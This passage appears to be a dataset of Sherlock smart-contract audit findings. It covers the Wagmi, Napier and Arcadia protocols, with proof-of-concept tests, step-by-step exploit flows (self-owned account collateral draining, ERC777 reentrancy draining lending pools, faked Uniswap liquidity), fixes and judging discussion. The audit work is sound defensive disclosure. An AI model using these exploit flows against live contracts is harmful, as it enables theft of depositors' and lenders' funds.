bob.address, borrowingKey);\n        \n        await expect(borrowingManager.connect(owner).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, owner.address, borrowingKey);\n    });\n```\n\nfann95\nI see in the tests that the amount of debt has decreased by part of the closed Lp-share, but the rest of the debt has been maintained, as expected. collateralBalance after advancing time BigNumber { value: ""-363497523148146947"" } collateralBalance after first liquidation (this is wrong, should be close to zero) BigNumber { value: ""-263884816316264683"" } debt(263884816316264683) < debt(363497523148146947)\n0xDetermination\n@fann95 That's weird, when I run in the contest repo the output is: collateralBalance BigNumber { value: ""6236502752476851853053"" } current collateral amount BigNumber { value: ""24948000000000000000000"" } estimated life time BigNumber { value: ""21598"" } collateralBalance after advancing time BigNumber { value: ""-181748761574072227"" } collateralBalance after first liquidation (this is wrong, should be close to zero) BigNumber { value: ""-18111392620173611109770"" }\nAlso, not sure if the test is passing on your end, but if it's passing I think the bug is there since the collateral is increased and emergency liq shouldn't happen\nfann95\nIt looks like this is a valid issue..I got different results since I ran your test in the updated version. The PR which corrected the problems with the distribution of commissions also corrected this problem.\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/RealWagmi/wagmi-leverage/commit/84416fcedfcc7eb062917bdc69f919bba9d3c0b7.\nnevillehuang\n@fann95 Is the root cause stemming from similar issues in #41 or only possible because of another issue, given fix PR is the same?\n0xDetermination\n@fann95 @nevillehuang Fix code looks good to me, PoC doesn't pass in the main repo.\nIn case my input is helpful- I think this issue is different than #41 since that issue describes a root cause/fix in `borrow()`, whereas the cause/fix for this issue is around not setting `dailyRateCollateralBalance` to zero in `repay()`. Additionally the PR is quite large and changes a lot of things.\nnevillehuang\n@fann95 @0xDetermination I am trying to figure out how the original fix could have fixed this issue without first considering it, which leads me to believe they share the same root causes revolving around distribution of fees. I would have to take a closer look at the fix PR.\nfann95\n@fann95 @0xDetermination I am trying to figure out how the original fix could have fixed this issue without first considering it, which leads me to believe they share the same root causes revolving around distribution of fees. I would have to take a closer look at the fix PR.\nThis problem is indirectly related to the distribution of commissions. I got rid of the mechanism for accumulating a fee, therefore the current error was fixed.\nnevillehuang\n@Czar102 @0xDetermination What are your thoughts here based on duplication rules here? The core vulnerability seem to stem from erroneous distribution of fees which allowed for this issue to be possible in the first place. I am inclined to think this should be duplicated with #41\nThere is a root cause/error/vulnerability A in the code. This vulnerability A -> leads to two attack paths:\nB -> high severity path\nC -> medium severity attack path/just identifying the vulnerability. Both B & C would not have been possible if error A did not exist in the first place. In this case, both B & C should be put together as duplicates.\n0xDetermination\n@nevillehuang @Czar102 The root cause and fix for this issue are both distinct from #41- the erroneous distribution of fees in #41 is caused by not harvesting fees when a new loan is taken with the `borrow()` function, and the fix is the new internal `_harvest()` function that runs in `borrow()`. (link)\nThis issue #40 is caused by the fee distribution mechanism in emergency liquidation mode in `repay()`, which is separate from `borrow()` and `harvest()`. The root cause and fix can both be seen here in `repay()`. The fix for #41 won't fix this issue.\nnevillehuang\nSince #39 and #41 talks about different types of fees, I agree they are not duplicates and they are both high severity findings. Given this erroneous fee calculation affects a large portion of the protocol, I agree with sponsor comments here and believe high severity is appropriate.\nHowever, I believe that #40 is a medium severity issue only possible because of the root cause of wrong computation of fees for borrowed positions within #41. This is evident from the fix employed without considering this issue in the first place. Hence, I am going to duplicate it with #41 and assign it as high severity based on sherlock rules despite it having only a medium severity impact.\n0xDetermination\nEscalate\nI understand @nevillehuang's point here, but I still think this shouldn't be a dup for the reasons I gave in my above comment. The fix PR changed a lot of things unrelated to validated issues, such as removal of the min fee mechanism.\nWill appreciate @Czar102's decision.\nAdditionally, if validated as not a dup, not sure if this should be H or M based on the 'external conditions' criteria.\nsherlock-admin2\nEscalate\nI understand @nevillehuang's point here, but I still think this shouldn't be a dup for the reasons I gave in my above comment. The fix PR changed a lot of things unrelated to validated issues, such as removal of the min fee mechanism.\nWill appreciate @Czar102's decision.\nAdditionally, if validated as not a dup, not sure if this should be H or M based on the 'external conditions' criteria.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nCzar102\n@nevillehuang can you elaborate on how does a fix to #40 follows from #41?\nnevillehuang\n@Czar102 I believe @fann95 answered it here and here\nBased on sponsor description and comments above, The PR fix was performed without consideration of this issue, which led me to believe this issue only stems from the root cause of incorrect distribution.\nCzar102\n@nevillehuang what is the single logical error (maybe an assumption, maybe approach) that led to both of these issues?\nHaving issue A which makes the sponsor want to restructure code and it accidentally removing issue B doesn't make them duplicates.\nfann95\nI propose to confirm this issue and not consider it a duplicate.\nnevillehuang\n@Czar102 It stems from the logic for fee distribution. Although I disagree, seems like sponsor agrees to deduplicate so we can proceed with deduplication.\nCzar102\n@nevillehuang regarding this:\nIt stems from the logic for fee distribution.\nI believe it doesn't answer my question:\nwhat is the single logical error (maybe an assumption, maybe approach) that led to both of these issues?\nI wanted to have a one-sentence description of the common ground of these issues, and the fact that the issues ""stem from the logic for fee distribution"" (are in the same part of the code logic) doesn't make them duplicates.\nI'm planning to make this issue a unique issue, unless a justification (as mentioned above) is provided.\nWhat are the considerations regarding the severity? @nevillehuang @0xDetermination what did you mean by the following fragment of your escalation?\nnot sure if this should be H or M based on the 'external conditions' criteria\n0xDetermination\n@Czar102 I'm not 100% sure whether this is better suited for H or M, as I don't have a ton of experience with Sherlock judging rules. Basically, the issue can cause serious loss of funds (borrower's entire collateral), but it is conditional on a partial emergency liquidation followed by the borrower increasing collateral. It looks more like M to me but I don't want to speak too soon, will leave it up to you and @nevillehuang. Happy to provide more info if needed.\nnevillehuang\nYup @Czar102 I agree with your decision, I cannot pinpoint an exact singular approach/code logic given this is an update contest and would take up too much time. The reason I duplicated them was on the side of caution, given the sponsor quite literally fix this issue without even considering it. But since sponsor also agree with deduplication, lets move ahead\nCzar102\nIn that case, planning to make this issue a unique Medium severity one.\nCzar102\nResult: Medium Unique\nsherlock-admin4\nEscalations have been resolved successfully!\nEscalation status:\n0xDetermination: accepted"чThe borrower may pay too many fees, and it's also possible to unfairly liquidate the position.\nCode Snippet\nTool used\nManual Review
Napier pool owner can unfairly increase protocol fees on swaps to earn more revenueчmediumч"```\n function test_protocol_owner_frontRuns_swaps_with_higher_fees() public whenMaturityNotPassed {\n        // pre-condition\n        vm.warp(maturity - 30 days);\n        deal(address(pts[0]), alice, type(uint96).max, false); // ensure alice has enough pt\n        uint256 preBaseLptSupply = tricrypto.totalSupply();\n        uint256 ptInDesired = 100 * ONE_UNDERLYING;\n        uint256 expectedBaseLptIssued = tricrypto.calc_token_amount([ptInDesired, 0, 0], true);\n\n        // Pool owner sees swap about to occur and front runs updating fees to max value\n        vm.startPrank(owner);\n        pool.setFeeParameter(""protocolFeePercent"", 100);\n        vm.stopPrank();\n\n        // execute\n        vm.prank(alice);\n        uint256 underlyingOut = pool.swapPtForUnderlying(\n            0, ptInDesired, recipient, abi.encode(CallbackInputType.SwapPtForUnderlying, SwapInput(underlying, pts[0]))\n        );\n        // sanity check\n        uint256 protocolFee = SwapEventsLib.getProtocolFeeFromLastSwapEvent(pool);\n        assertGt(protocolFee, 0, ""fee should be charged"");\n    }\n```\n"ч"Currently there is no limit to how often a `poolOwner` can update fees which can be abused to earn more fees by charging users higher swap fees than they expect.\nThe `NapierPool::setFeeParameter` function allows the `poolOwner` to set the `protocolFeePercent` at any point to a maximum value of 100%. The `poolOwner` is a trusted party but should not be able to abuse protocol settings to earn more revenue. There are no limits to how often this can be updated.\n```\n function test_protocol_owner_frontRuns_swaps_with_higher_fees() public whenMaturityNotPassed {\n        // pre-condition\n        vm.warp(maturity - 30 days);\n        deal(address(pts[0]), alice, type(uint96).max, false); // ensure alice has enough pt\n        uint256 preBaseLptSupply = tricrypto.totalSupply();\n        uint256 ptInDesired = 100 * ONE_UNDERLYING;\n        uint256 expectedBaseLptIssued = tricrypto.calc_token_amount([ptInDesired, 0, 0], true);\n\n        // Pool owner sees swap about to occur and front runs updating fees to max value\n        vm.startPrank(owner);\n        pool.setFeeParameter(""protocolFeePercent"", 100);\n        vm.stopPrank();\n\n        // execute\n        vm.prank(alice);\n        uint256 underlyingOut = pool.swapPtForUnderlying(\n            0, ptInDesired, recipient, abi.encode(CallbackInputType.SwapPtForUnderlying, SwapInput(underlying, pts[0]))\n        );\n        // sanity check\n        uint256 protocolFee = SwapEventsLib.getProtocolFeeFromLastSwapEvent(pool);\n        assertGt(protocolFee, 0, ""fee should be charged"");\n    }\n```\n"ч
`swapUnderlyingForYt` revert due to rounding issuesчmediumч```\nuDepositNoFee = cscale * ytOutDesired / maxscale;\nuDepositNoFee = 1.2e18 * 123 / 1.25e18 = 118.08 = 118 (Round down)\n\nuDeposit = uDepositNoFee * MAX_BPS / (MAX_BPS - (series.issuanceFee + 1))\nuDeposit = 118 * 10000 / (10000 - (0 + 1)) = 118.0118012 = 118 (Round down)\n```\nчThe core function (swapUnderlyingForYt) of the Router will revert due to rounding issues. Users who intend to swap underlying assets to YT tokens via the Router will be unable to do so.\nThe `swapUnderlyingForYt` allows users to swap underlying assets to a specific number of YT tokens they desire.\nLine 353-354 above compute the number of underlying deposits needed to send to the Tranche to issue the amount of YT token the users desired. It attempts to add a buffer of 0.01 bps buffer to prevent rounding errors that could lead to insufficient PT being repaid to the pool and result in a revert. During the audit, it was found that this buffer is ineffective in achieving its purpose.\nThe following example/POC demonstrates a revert could still occur due to insufficient PT being repaid despite having a buffer:\nLet the state be the following:\ncscale = 1.2e18\nmaxScale = 1.25e18\nytOutDesired = 123\nissuanceFee = 0% (For simplicity's sake, the fee is set to zero. Having fee or not does not affect the validity of this issue as this is a math problem)\nThe following computes the number of underlying assets to be transferred to the Tranche to mint/issue PY + YT\n```\nuDepositNoFee = cscale * ytOutDesired / maxscale;\nuDepositNoFee = 1.2e18 * 123 / 1.25e18 = 118.08 = 118 (Round down)\n\nuDeposit = uDepositNoFee * MAX_BPS / (MAX_BPS - (series.issuanceFee + 1))\nuDeposit = 118 * 10000 / (10000 - (0 + 1)) = 118.0118012 = 118 (Round down)\n```\n\nSubsequently, the code will perform a flash-swap via the `swapPtForUnderlying` function. It will borrow 123 PT from the pool, which must be repaid later.\nIn the swap callback function, the code will transfer 118 underlying assets to the Tranche and execute the `Tranche.issue` function to mint/issue PY + YT.\nWithin the `Tranche.issue` function, it will trigger the `adapter.prefundedDeposit()` function to mint the estETH/shares. The following is the number of estETH/shares minted:\n```\nshares = assets * (total supply/total assets)\nsahres = 118 * 100e18 / 120e18 = 98.33333333 = 98 shares\n```\n\nNext, Line 219 below of the `Tranche.issue` function will compute the number of PY+YT to be issued/minted\n```\nissued = (sharesUsed - fee).mulWadDown(_maxscale);\nissued = (sharesUsed - 0).mulWadDown(_maxscale);\nissued = sharesUsed.mulWadDown(_maxscale);\n\nissued = sharesUsed * _maxscale / WAD\nissued = 98 * 1.25e18 / 1e18 = 122.5 = 122 PT (Round down)\n```\n\nAt the end of the `Tranche.issue` function, 122 PY + YT is issued/minted back to the Router.\nNote that 123 PT was flash-loaned earlier, and 123 PT needs to be repaid. Otherwise, the code at Line 164 below will revert. The main problem is that only 122 PY was issued/minted (a shortfall of 1 PY). Thus, the swap TX will revert at the end.ч
Unable to deposit to Tranche/Adaptor under certain conditionsчmediumч"```\n/// @notice Mint frxETH to the recipient using sender's funds. Internal portion\nfunction _submit(address recipient) internal nonReentrant {\n    // Initial pause and value checks\n    require(!submitPaused, ""Submit is paused"");\n    require(msg.value != 0, ""Cannot submit 0"");\n```\n"ч"Minting of PT and YT is the core feature of the protocol. Without the ability to mint PT and YT, the protocol would not operate.\nThe user cannot deposit into the Tranche to issue new PT + YT under certain conditions.\nThe comment in Line 133 below mentioned that the `stakeAmount` can be zero.\nThe reason is that when `targetBufferEth < (availableEth + queueEthCache)`, it is possible that there is a pending withdrawal request (queueEthCache) and no available ETH left in the buffer (availableEth = 0). Refer to the comment in Line 123 below.\nAs a result, the code at Line 127 below will restrict the amount of ETH to be staked and set the `stakeAmount` to zero.\nHowever, the issue is that when `_stake` function is called with `stakeAmount` set to zero, it will result in zero ETH being staked and Line 77 below will revert.\nA similar issue also occurs for the sFRXETH adaptor. If `FRXETH_MINTER.submit` function is called with `stakeAmount == 0`, it will revert.\nThe following shows that the `FRXETH_MINTER.submit` function will revert if submitted ETH is zero below.\nhttps://etherscan.io/address/0xbAFA44EFE7901E04E39Dad13167D089C559c1138#code#F1#L89\n```\n/// @notice Mint frxETH to the recipient using sender's funds. Internal portion\nfunction _submit(address recipient) internal nonReentrant {\n    // Initial pause and value checks\n    require(!submitPaused, ""Submit is paused"");\n    require(msg.value != 0, ""Cannot submit 0"");\n```\n"чShort-circuit the `_stake` function by returning zero value immediately if the `stakeAmount` is zero.\n```\nfunction _stake(uint256 stakeAmount) internal override returns (uint256) {\n// Add the line below\n if (stakeAmount == 0) return 0; \n uint256 stakeLimit = STETH.getCurrentStakeLimit();\n if (stakeAmount > stakeLimit) {\n  // Cap stake amount\n  stakeAmount = stakeLimit;\n }\n\n IWETH9(Constants.WETH).withdraw(stakeAmount);\n uint256 _stETHAmt = STETH.submit{value: stakeAmount}(address(this));\n\n if (_stETHAmt == 0) revert InvariantViolation();\n return stakeAmount;\n}\n```\n\n```\nfunction _stake(uint256 stakeAmount) internal override returns (uint256) {\n// Add the line below\n if (stakeAmount == 0) return 0; \n IWETH9(Constants.WETH).withdraw(stakeAmount);\n FRXETH_MINTER.submit{value: stakeAmount}();\n uint256 received = STAKED_FRXETH.deposit(stakeAmount, address(this));\n if (received == 0) revert InvariantViolation();\n\n return stakeAmount;\n}\n```\n\nDiscussion\nsherlock-admin3\nThe protocol team fixed this issue in PR/commit https://github.com/napierfi/napier-v1/pull/169.чMinting of PT and YT is the core feature of the protocol. Without the ability to mint PT and YT, the protocol would not operate. The user cannot deposit into the Tranche to issue new PT + YT under certain conditions. Breaking of core protocol/contract functionality.\nCode Snippet\nTool used\nManual Review
SFrxETHAdapter redemptionQueue waiting period can DOS adapter functionsчmediumч```\n    function prefundedRedeem(address recipient) external virtual returns (uint256, uint256) {\n        // SOME CODE\n\n        // If the buffer is insufficient, shares cannot be redeemed immediately\n        // Need to wait for the withdrawal to be completed and the buffer to be refilled.\n>     if (assets > bufferEthCache) revert InsufficientBuffer();\n\n        // SOME CODE\n    }\n```\nчThe waiting period between `rebalancer` address making a withdrawal request and the withdrawn funds being ready to claim from `FraxEtherRedemptionQueue` is extremely long which can lead to a significant period of time where some of the protocol's functions are either unusable or work in a diminished capacity.\n`BaseLSTAdapter::requestWithdrawal()` is an essential function which helps to maintain `bufferEth` at a defined, healthy level. `bufferEth` is a facility which smooth running of redemptions and deposits.\nFor redemptions; it allows users to redeem `underlying` without having to wait for any period of time. However, redemption amounts requested which are less than `bufferEth` will be rejected as can be seen below in `BaseLSTAdapter::prefundedRedeem()`. Further, there is nothing preventing `redemptions` from bringing `bufferEth` all the way to `0`.\n```\n    function prefundedRedeem(address recipient) external virtual returns (uint256, uint256) {\n        // SOME CODE\n\n        // If the buffer is insufficient, shares cannot be redeemed immediately\n        // Need to wait for the withdrawal to be completed and the buffer to be refilled.\n>     if (assets > bufferEthCache) revert InsufficientBuffer();\n\n        // SOME CODE\n    }\n```\n\nFor deposits; where `bufferEth` is too low, it keeps user `deposits` in the contract until a deposit is made which brings `bufferEth` above it's target, at which point it stakes. During this time, the `deposits`, which are kept in the adapter, do not earn any yield; making those funds unprofitable.\n```\n    function prefundedDeposit() external nonReentrant returns (uint256, uint256) {\n    // SOME CODE\n>     if (targetBufferEth >= availableEth + queueEthCache) {\n>         bufferEth = availableEth.toUint128();\n            return (assets, shares);\n        }\n    // SOME CODE\n    }\n```\nч
`AccountV1#flashActionByCreditor` can be used to drain assets from account without withdrawingчhighч```\n1) Deposit ERC721\n2) Set creditor to malicious designed creditor\n3) Transfer the account to itself\n4) flashActionByCreditor to transfer ERC721\n    4a) account owns itself so _transferFromOwner allows transfers from account\n    4b) Account is now empty but still thinks is has ERC721\n5) Use malicious designed liquidator contract to call auctionBoughtIn\n    and transfer account back to attacker\n7) Update creditor to legitimate creditor\n8) Take out loan against nothing\n9) Profit\n```\nч`AccountV1#flashActionByCreditor` is designed to allow atomic flash actions moving funds from the `owner` of the account. By making the account own itself, these arbitrary calls can be used to transfer `ERC721` assets directly out of the account. The assets being transferred from the account will still show as deposited on the account allowing it to take out loans from creditors without having any actual assets.\nThe overview of the exploit are as follows:\n```\n1) Deposit ERC721\n2) Set creditor to malicious designed creditor\n3) Transfer the account to itself\n4) flashActionByCreditor to transfer ERC721\n    4a) account owns itself so _transferFromOwner allows transfers from account\n    4b) Account is now empty but still thinks is has ERC721\n5) Use malicious designed liquidator contract to call auctionBoughtIn\n    and transfer account back to attacker\n7) Update creditor to legitimate creditor\n8) Take out loan against nothing\n9) Profit\n```\n\nThe key to this exploit is that the account is able to be it's own `owner`. Paired with a maliciously designed `creditor` (creditor can be set to anything) `flashActionByCreditor` can be called by the attacker when this is the case.\n```\nif (transferFromOwnerData.assets.length > 0) {\n    _transferFromOwner(transferFromOwnerData, actionTarget);\n}\n```\n\nIn these lines the `ERC721` token is transferred out of the account. The issue is that even though the token is transferred out, the `erc721Stored` array is not updated to reflect this change.\n```\nfunction auctionBoughtIn(address recipient) external onlyLiquidator nonReentrant {\n    _transferOwnership(recipient);\n}\n```\n\nAs seen above `auctionBoughtIn` does not have any requirement besides being called by the `liquidator`. Since the `liquidator` is also malicious. It can then abuse this function to set the `owner` to any address, which allows the attacker to recover ownership of the account. Now the attacker has an account that still considers the `ERC721` token as owned but that token isn't actually present in the account.\nNow the account creditor can be set to a legitimate pool and a loan taken out against no collateral at all.чThe root cause of this issue is that the account can own itself. The fix is simple, make the account unable to own itself by causing transferOwnership to revert if `owner == address(this)`\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: flashActionByCreditor should be mitigated; high(7)\nj-vp\nCreated a (very) quick & dirty POC to confirm the validity:\nj-vp\nI don't see a reasonable usecase where an account should own itself. wdyt @Thomas-Smets ?\n```\nfunction transferOwnership(address newOwner) external onlyFactory notDuringAuction {\n    if (block.timestamp <= lastActionTimestamp + COOL_DOWN_PERIOD) revert AccountErrors.CoolDownPeriodNotPassed();\n\n    // The Factory will check that the new owner is not address(0).\n+   if (newOwner == address(this)) revert NoTransferToSelf();\n    owner = newOwner;\n}\n\nfunction _transferOwnership(address newOwner) internal {\n    // The Factory will check that the new owner is not address(0).\n+   if (newOwner == address(this)) revert NoTransferToSelf();\n    owner = newOwner;\n    IFactory(FACTORY).safeTransferAccount(newOwner);\n}\n```\n\nThomas-Smets\nNo indeed, that should fix it\nThomas-Smets\nFixes:\naccounts: https://github.com/arcadia-finance/accounts-v2/pull/171\nlending: https://github.com/arcadia-finance/lending-v2/pull/132\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/accounts-v2/pull/171.чAccount can take out completely uncollateralized loans, causing massive losses to all lending pools.\nCode Snippet\nTool used\nManual Review
Reentrancy in flashAction() allows draining liquidity poolsчhighч```\nfunction _settleAuction(address account, AuctionInformation storage auctionInformation_)\n        internal\n        returns (bool success)\n    {\n        // Cache variables.\n        uint256 startDebt = auctionInformation_.startDebt;\n        address creditor = auctionInformation_.creditor;\n        uint96 minimumMargin = auctionInformation_.minimumMargin;\n\n        uint256 collateralValue = IAccount(account).getCollateralValue();\n        uint256 usedMargin = IAccount(account).getUsedMargin();\n \n        // Check the different conditions to end the auction.\n        if (collateralValue >= usedMargin || usedMargin == minimumMargin) { \n            // Happy flow: Account is back in a healthy state.\n            // An Account is healthy if the collateral value is equal or greater than the used margin.\n            // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is always healthy.\n            ILendingPool(creditor).settleLiquidationHappyFlow(account, startDebt, minimumMargin, msg.sender);\n        } else if (collateralValue == 0) {\n            // Unhappy flow: All collateral is sold.\n            ILendingPool(creditor).settleLiquidationUnhappyFlow(account, startDebt, minimumMargin, msg.sender);\n        }\n    // rest of code\n     \n    \n        return true;\n    }\n```\nчIt is possible to drain a liquidity pool/creditor if the pool’s asset is an ERC777 token by triggering a reentrancy flow using flash actions.\nThe following vulnerability describes a complex flow that allows draining any liquidity pool where the underlying asset is an ERC777 token. Before diving into the vulnerability, it is important to properly understand and highlight some concepts from Arcadia that are relevant in order to allow this vulnerability to take place:\nWith this background, we can now move on to describing the vulnerability in full.\nInitially, we will create an account and deposit collateral whose value is in the limit of the configured `minUsdValue` (if the `minUsdValue` is 100 tokens, the ideal amount to have will be 100 tokens to maximize gains). We will see why this is required later. The account’s collateral and debt status will look like this:\n\nThe next step after creating the account is to trigger a flash action. As mentioned in the introduction, the borrowed funds will be sent to the `actionTarget` (this will be a contract we create and control). An important requirement is that if the borrowed asset is an ERC777 token, we will be able to execute the ERC777 callback in our `actionTarget` contract, enabling us to gain control of the execution flow. Following our example, if we borrowed 200 tokens the account’s status would look like this:\n\nOn receiving the borrowed tokens, the actual attack will begin. TheactionTarget will trigger the `Liquidator.liquidateAccount()` function to liquidate our own account. This is possible because the funds borrowed using the flash action are accounted as debt for our account (as we can see in the previous image, the borrowed amount greatly surpasses our account’s collateral value) prior to executing the `actionTarget` ERC777 callback, making the account susceptible of being liquidated. Executing this function will start the auction process and store data relevant to the account and its debt in the `auctionInformation_` mapping.\nAfter finishing the `liquidateAccount()` execution, the next step for the `actionTarget` is to place a bid for our own account auction calling `Liquidator.bid()`. The trick here is to request a small amount from the account’s collateral in the `askedAssetAmounts` array (if we had 100 tokens as collateral in the account, we could ask for only 1). The small requested amount will make the computed `price` to pay for the bid by `_calculateBidPrice()` be really small so that we can maximize our gains. Another requirement will be to set the `endAuction_` parameter to `true` (we will see why later):\nAfter computing the small price to pay for the bid, theLendingPool.auctionRepay() will be called. Because we are repaying a really small amount from the debt, the `accountDebt <= amount` condition will NOT hold, so the only actions performed by `LendingPool.auctionRepay()` will be transferring the small amount of tokens to pay the bid, and `_withdraw()` (burn) the corresponding debt from the account (a small amount of debt will be burnt here because the bid amount is small). It is also important to note that the `earlyTerminate` flag will remain as false:\nAfter `LendingPool.auctionRepay()` , execution will go back to `Liquidator.bid()`. The account’s `auctionBid()` function will then be called, which will transfer the 1 token requested by the bidder in the `askedAssetAmounts` parameter from the account’s collateral to the bidder. This is the most important concept in the attack. Because 1 token is moving out from the account’s collateral, the current collateral value from the account will be decreased from 100 USD to 99 USD, making the collateral value be under the minimum `minUsdValue` amount of 100 USD, and thus making the collateral value from the account go straight to 0 at the eyes of the creditor:\n\nBecause the `earlyTerminate` was NOT set to `true` in `LendingPool.auctionRepay()`, the `if (earlyTerminate)` condition will be skipped, going straight to evaluate the `else if (endAuction_)` condition . Because we set theendAuction_ parameter to `true` when calling the `bid()` function, `_settleAuction()` will execute.\n`_settleAuction()` is where the final steps of the attack will take place. Because we made the collateral value of our account purposely decrease from the `minUsdValue`, `_settleAuction` will interpret that all collateral has been sold, and the `else if (collateralValue == 0)` will evaluate to true, making the creditor’s `settleLiquidationUnhappyFlow()` function be called:\n```\nfunction _settleAuction(address account, AuctionInformation storage auctionInformation_)\n        internal\n        returns (bool success)\n    {\n        // Cache variables.\n        uint256 startDebt = auctionInformation_.startDebt;\n        address creditor = auctionInformation_.creditor;\n        uint96 minimumMargin = auctionInformation_.minimumMargin;\n\n        uint256 collateralValue = IAccount(account).getCollateralValue();\n        uint256 usedMargin = IAccount(account).getUsedMargin();\n \n        // Check the different conditions to end the auction.\n        if (collateralValue >= usedMargin || usedMargin == minimumMargin) { \n            // Happy flow: Account is back in a healthy state.\n            // An Account is healthy if the collateral value is equal or greater than the used margin.\n            // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is always healthy.\n            ILendingPool(creditor).settleLiquidationHappyFlow(account, startDebt, minimumMargin, msg.sender);\n        } else if (collateralValue == 0) {\n            // Unhappy flow: All collateral is sold.\n            ILendingPool(creditor).settleLiquidationUnhappyFlow(account, startDebt, minimumMargin, msg.sender);\n        }\n    // rest of code\n     \n    \n        return true;\n    }\n```\n\nExecuting the `settleLiquidationUnhappyFlow()` will burn ALL the remaining debt (balanceOf[account] will return all the remaining balance of debt tokens for the account), and the liquidation will be finished, calling `_endLiquidation()` and leaving the account with 99 tokens of collateral and a 0 amount of debt (and the `actionTarget` with ALL the borrowed funds taken from the flash action).\nAfter the actionTarget's ERC777 callback execution, the execution flow will return to the initially called `flashAction()` function, and the final `IAccount(account).flashActionByCreditor()` function will be called, which will pass all the health checks due to the fact that all the debt from the account was burnt:\nProof of Concept\nThe following proof of concept illustrates how the previously described attack can take place. Follow the steps in order to reproduce it:чThis attack is possible because the `getCollateralValue()` function returns a 0 collateral value due to the `minUsdValue` mentioned before not being reached after executing the bid. The Liquidator’s `_settleAuction()` function then believes the collateral held in the account is 0.\nIn order to mitigate the issue, consider fetching the actual real collateral value inside `_settleAuction()` even if it is less than the `minUsdValue` held in the account, so that the function can properly check if the full collateral was sold or not.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: high(2)\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/lending-v2/pull/133.\nThomas-Smets\nFix consists out of two PR's:\naccounts: https://github.com/arcadia-finance/accounts-v2/pull/173\nlending: https://github.com/arcadia-finance/lending-v2/pull/133чThe impact for this vulnerability is high. All funds deposited in creditors with ERC777 tokens as the underlying asset can be drained.\nCode Snippet\nTool used\nManual Review, foundry
Caching Uniswap position liquidity allows borrowing using undercollateralized Uni positionsчhighч```\nfunction _addAsset(uint256 assetId) internal {\n        // rest of code\n\n        (,, address token0, address token1,,,, uint128 liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n\n        // No need to explicitly check if token0 and token1 are allowed, _addAsset() is only called in the\n        // deposit functions and there any deposit of non-allowed Underlying Assets will revert.\n        if (liquidity == 0) revert ZeroLiquidity();\n\n        // The liquidity of the Liquidity Position is stored in the Asset Module,\n        // not fetched from the NonfungiblePositionManager.\n        // Since liquidity of a position can be increased by a non-owner,\n        // the max exposure checks could otherwise be circumvented.\n        assetToLiquidity[assetId] = liquidity;\n\n        // rest of code\n    }\n```\nчIt is possible to fake the amount of liquidity held in a Uniswap V3 position, making the protocol believe the Uniswap position has more liquidity than the actual liquidity deposited in the position. This makes it possible to borrow using undercollateralized Uniswap positions.\nWhen depositing into an account, the `deposit()` function is called, which calls the internal `_deposit()` function. Depositing is performed in two steps:\nThe registry’s `batchProcessDeposit()` function is called. This function checks if the deposited assets can be priced, and in case that a creditor is set, it also updates the exposures and underlying assets for the creditor.\nThe assets are transferred and deposited into the account.\nFor Uniswap positions (and assuming that a creditor is set), calling `batchProcessDeposit()` will internally trigger the UniswapV3AM.processDirectDeposit():\nThe Uniswap position will then be added to the protocol using the internal `_addAsset()` function. One of the most important actions performed inside this function is to store the liquidity that the Uniswap position has in that moment. Such liquidity is obtained from directly querying the NonfungiblePositionManager contract:\n```\nfunction _addAsset(uint256 assetId) internal {\n        // rest of code\n\n        (,, address token0, address token1,,,, uint128 liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);\n\n        // No need to explicitly check if token0 and token1 are allowed, _addAsset() is only called in the\n        // deposit functions and there any deposit of non-allowed Underlying Assets will revert.\n        if (liquidity == 0) revert ZeroLiquidity();\n\n        // The liquidity of the Liquidity Position is stored in the Asset Module,\n        // not fetched from the NonfungiblePositionManager.\n        // Since liquidity of a position can be increased by a non-owner,\n        // the max exposure checks could otherwise be circumvented.\n        assetToLiquidity[assetId] = liquidity;\n\n        // rest of code\n    }\n```\n\nAs the snippet shows, the liquidity is stored in a mapping because “Since liquidity of a position can be increased by a non-owner, the max exposure checks could otherwise be circumvented.”. From this point forward, and until the Uniswap position is withdrawn from the account, the collateral value (i.e the amount that the position is worth) will be computed utilizing the `_getPosition()` internal function, which will read the cached liquidity value stored in the `assetToLiquidity[assetId]` mapping, rather than directly consulting the NonFungibleManager contract. This way, the position won’t be able to surpass the max exposures:\nHowever, storing the liquidity leads to an attack vector that allows Uniswap positions’ liquidity to be comlpetely withdrawn while making the protocol believe that the Uniswap position is still full.\nAs mentioned in the beginning of the report, the deposit process is done in two steps: processing assets in the registry and transferring the actual assets to the account. Because processing assets in the registry is the step where the Uniswap position’s liquidity is cached, a malicious depositor can use an ERC777 hook in the transferring process to withdraw the liquidity in the Uniswap position.\nThe following steps show how the attack could be performed:\nInitially, a malicious contract must be created. This contract will be the one holding the assets and depositing them into the account, and will also be able to trigger the ERC777’s `tokensToSend()` hook.\nThe malicious contract will call the account’s `deposit()` function with two `assetAddresses` to be deposited: the first asset must be an ERC777 token, and the second asset must be the Uniswap position.\n`IRegistry(registry).batchProcessDeposit()` will then execute. This is the first of the two steps taking place to deposit assets, where the liquidity from the Uniswap position will be fetched from the NonFungiblePositionManager and stored in the `assetToLiquidity[assetId]` mapping.\nAfter processing the assets, the transferring phase will start. The first asset to be transferred will be the ERC777 token. This will trigger the `tokensToSend()` hook in our malicious contract. At this point, our contract is still the owner of the Uniswap position (the Uniswap position won’t be transferred until the ERC777 transfer finishes), so the liquidity in the Uniswap position can be decreased inside the hook triggered in the malicious contract. This leaves the Uniswap position with a smaller liquidity amount than the one stored in the `batchProcessDeposit()` step, making the protocol believe that the liquidity stored in the position is the one that the position had prior to starting the attack.\nFinally, and following the transfer of the ERC777 token, the Uniswap position will be transferred and succesfully deposited in the account. Arcadia will believe that the account has a Uniswap position worth some liquidity, when in reality the Uni position will be empty.\nProof of Concept\nThis proof of concept show show the previous attack can be performed so that the liquidity in the uniswap position is 0, while the collateral value for the account is far 